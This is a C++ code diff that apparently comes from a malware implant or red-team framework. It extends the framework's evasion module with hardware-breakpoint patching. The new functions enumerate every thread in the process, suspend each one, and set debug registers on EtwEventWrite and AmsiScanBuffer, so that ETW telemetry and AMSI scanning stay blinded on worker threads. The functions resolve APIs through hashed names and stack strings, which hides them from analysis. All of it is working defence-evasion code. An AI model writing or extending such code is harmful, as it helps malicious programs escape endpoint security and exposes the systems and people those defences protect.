@@ -1,6 +1,7 @@
 #include <common.h>
 #include <module.h>
 #include <stackstr.h>
+#include <tlhelp32.h>
 #include <evasion/spoof_dispatch.h>
 
 #if defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)
@@ -116,6 +117,10 @@ static auto declfn ensure_veh_installed( instance& inst ) -> bool {
 // Fires ud2 (0x0F 0x0B) with target in RCX, DR index in RDX, magic in RSI.
 // VEH handler catches EXCEPTION_ILLEGAL_INSTRUCTION, sets DR registers via
 // ContextRecord, advances RIP by 2. Fully PIC - no static data.
+//
+// LIMITATION: debug registers are per-thread. ud2 only patches the calling
+// thread. patch_etw/patch_amsi callers must also run hwbp_patch_all_threads()
+// after spawning worker threads, or threads created later run unpatched.
 
 static auto declfn set_hw_breakpoint(
     instance& inst,
@@ -145,6 +150,99 @@ static auto declfn set_hw_breakpoint(
     return result != 0;
 #endif
 }
+
+#ifdef _WIN64
+
+typedef BOOL  (WINAPI *fnThread32First)( HANDLE, LPTHREADENTRY32 );
+typedef BOOL  (WINAPI *fnThread32Next)( HANDLE, LPTHREADENTRY32 );
+typedef NTSTATUS (NTAPI *fnNtGetContextThread)( HANDLE, PCONTEXT );
+typedef NTSTATUS (NTAPI *fnNtSetContextThread)( HANDLE, PCONTEXT );
+
+/* Patch DR registers on an arbitrary thread via NtGet/NtSetContextThread.
+ * Suspends the target first so its context is stable. The ud2/VEH path
+ * (set_hw_breakpoint) only reaches the calling thread - worker threads
+ * spawned after patch_etw() would otherwise run with ETW/AMSI unpatched. */
+static auto declfn hwbp_patch_thread(
+    instance& inst, HANDLE h_thread,
+    void* etw_target, void* amsi_target ) -> bool
+{
+    auto pGetCtx = reinterpret_cast<fnNtGetContextThread>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtGetContextThread" ) ) );
+    auto pSetCtx = reinterpret_cast<fnNtSetContextThread>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtSetContextThread" ) ) );
+    auto pSuspend = reinterpret_cast<DWORD (WINAPI*)( HANDLE )>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );
+    auto pResume = reinterpret_cast<DWORD (WINAPI*)( HANDLE )>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );
+
+    if ( !pGetCtx || !pSetCtx || !pSuspend || !pResume ) return false;
+
+    if ( pSuspend( h_thread ) == (DWORD)-1 ) return false;
+
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    bool ok = false;
+
+    if ( pGetCtx( h_thread, &ctx ) == 0 ) {
+        if ( etw_target ) {
+            ctx.Dr0 = reinterpret_cast<DWORD64>( etw_target );
+            ctx.Dr7 |= ( 1ULL << 0 );
+        }
+        if ( amsi_target ) {
+            ctx.Dr1 = reinterpret_cast<DWORD64>( amsi_target );
+            ctx.Dr7 |= ( 1ULL << 2 );
+        }
+        ok = ( pSetCtx( h_thread, &ctx ) == 0 );
+    }
+
+    pResume( h_thread );
+    return ok;
+}
+
+/* Walk every thread in the current process and apply the DR patch.
+ * Call after spawning worker threads; each new thread needs one pass.
+ * Current thread is skipped (already patched via ud2). */
+static auto declfn hwbp_patch_all_threads(
+    instance& inst, void* etw_target, void* amsi_target ) -> void
+{
+    auto pSnap = reinterpret_cast<HANDLE (WINAPI*)( DWORD, DWORD )>(
+        resolve::_api( inst.kernel32.handle,
+            expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
+    auto pFirst = reinterpret_cast<fnThread32First>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
+    auto pNext = reinterpret_cast<fnThread32Next>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
+    auto pOpen = reinterpret_cast<HANDLE (WINAPI*)( DWORD, BOOL, DWORD )>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
+
+    if ( !pSnap || !pFirst || !pNext || !pOpen ) return;
+
+    DWORD pid = RtlGetCurrentProcessId();
+    DWORD tid = RtlGetCurrentThreadId();
+
+    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
+    if ( snap == INVALID_HANDLE_VALUE ) return;
+
+    THREADENTRY32 te = {};
+    te.dwSize = sizeof( THREADENTRY32 );
+
+    if ( pFirst( snap, &te ) ) {
+        do {
+            if ( te.th32OwnerProcessID != pid ) continue;
+            if ( te.th32ThreadID == tid ) continue;
+
+            HANDLE ht = pOpen( THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
+                               THREAD_SET_CONTEXT, FALSE, te.th32ThreadID );
+            if ( !ht ) continue;
+
+            hwbp_patch_thread( inst, ht, etw_target, amsi_target );
+            inst.kernel32.CloseHandle( ht );
+        } while ( pNext( snap, &te ) );
+    }
+    inst.kernel32.CloseHandle( snap );
+}
+
+#endif /* _WIN64 */
 
 #ifdef INCLUDE_EVASION_ETW
 static auto declfn patch_etw( instance& inst ) -> bool {
@@ -208,6 +306,38 @@ auto declfn evasion_patch_amsi( instance& inst ) -> void {
             symbol<const char*>( "FAIL" ) );
 }
 #endif
+
+#ifdef _WIN64
+/* Re-apply DR patches to every thread in the process. Call after spawning
+ * any worker thread - debug registers are per-thread and threads created
+ * after patch_etw/patch_amsi run with those hooks absent. */
+auto declfn evasion_hwbp_repatch( instance& inst ) -> void {
+    void* etw_target = nullptr;
+    void* amsi_target = nullptr;
+
+#ifdef INCLUDE_EVASION_ETW
+    if ( inst.evasion.etw_patched ) {
+        etw_target = reinterpret_cast<void*>(
+            resolve::_api( inst.ntdll.handle,
+                expr::hash_string( "EtwEventWrite" ) ) );
+    }
+#endif
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+    if ( inst.evasion.amsi_patched ) {
+        STK_AMSI(_n_amsi);
+        auto h_amsi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_amsi );
+        if ( h_amsi ) {
+            amsi_target = reinterpret_cast<void*>(
+                resolve::_api( reinterpret_cast<uintptr_t>( h_amsi ),
+                    expr::hash_string( "AmsiScanBuffer" ) ) );
+        }
+    }
+#endif
+    if ( etw_target || amsi_target ) {
+        hwbp_patch_all_threads( inst, etw_target, amsi_target );
+    }
+}
+#endif /* _WIN64 */
 
 } // namespace starburst
 
